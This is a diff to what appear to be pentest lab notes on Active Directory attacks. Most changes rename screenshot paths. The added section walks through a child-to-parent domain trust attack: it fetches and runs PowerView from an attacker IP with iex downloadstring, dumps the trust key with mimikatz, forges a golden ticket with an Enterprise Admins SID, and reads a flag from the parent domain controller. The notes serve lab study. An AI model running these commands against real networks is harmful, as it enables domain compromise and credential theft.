@@ -532,7 +532,7 @@ runas /user:corp\jen powershell.exe
 * Add target DC and generic domain to /etc/hosts
   *
 
-      <figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * IMPT: THE SOURCE OF THE KERBEROS REQUEST MATTERS!!! --> SET UP [LIGOLO-NG!](../post-exploitation/port-forwarding-pivoting.md#ligolo-ng)
@@ -619,7 +619,7 @@ runas /user:corp\jen powershell.exe
 * Can add new access rights like GenericAll, GenericWrite, or even DCSync
 *
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 * Adding GenericAll rights:
   * ```powershell
     # Might need to migrate to sqlsvc process using metasploit
@@ -813,7 +813,7 @@ nslookup appsrv01
           <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
-      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
         *   ```powershell
             impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104
             ```
@@ -897,7 +897,7 @@ nslookup appsrv01
     </strong><strong>Get-DomainUser -TrustedToAuth
     </strong></code></pre>
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Contained delegation is configured on IISSvc and it is only allowed to MSSQLSvc
@@ -1224,3 +1224,43 @@ klist
 <figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 </details>
+
+<details>
+
+<summary>Trust Exploitation Against Parent Domain</summary>
+
+Already compromised `internal.zsm.local` --> trying to compromise parent domain `zsm.local`
+
+Use PowerView to Enumerate the Domains SID:
+
+```powershell
+iex (new-object net.webclient).downloadstring('http://10.10.14.4/PowerView.ps1')
+Get-DomainSID -Domain internal.zsm.local
+Get-DomainSID -Domain zsm.local
+```
+
+Obtain the trust key in rc4 format
+
+```bash
+.\mimikatz.exe
+lsadump::trust /patch
+```
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+
+
+```bash
+Kerberos::golden /user:Administrator /domain:internal.zsm.local /sid:S-1-5-21-3056178012-3972705859-491075245 /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:65065df3af96b70f29606e2719000eb4 /service:krbtgt /target:zsm.local /ticket:trustkey.kirbi
+# kerberos::golden /user:<USERNAME> /domain:<DOMAIN_NAME> /sid:<ORIGINAL_DOMAIN_SID> /sids:<PARENT_DOMAIN_SID>-519 /rc4:<KRB_TGT_RC4_KEY> /service:<KERBEROS_SERVICE_SP> /target:<TARGET_REALM> /ticket:<OUTPUT_TICKET_FILENAME>
+```
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+```bash
+dir \\ZPH-SVRDC01.zsm.local\c$
+type \\ZPH-SVRDC01.zsm.local\c$\users\administrator\desktop\flag.txt
+```
+
+</details>
+
